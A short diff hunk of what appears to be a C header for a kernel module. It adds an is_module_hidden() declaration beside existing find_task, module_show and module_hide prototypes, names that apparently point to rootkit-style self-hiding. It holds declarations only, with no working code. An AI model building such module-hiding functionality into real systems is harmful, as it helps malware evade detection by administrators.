@@ -13,3 +13,5 @@ struct task_struct *find_task(pid_t pid);
 
 void module_show(void);
 void module_hide(void);
+
+int is_module_hidden(void);
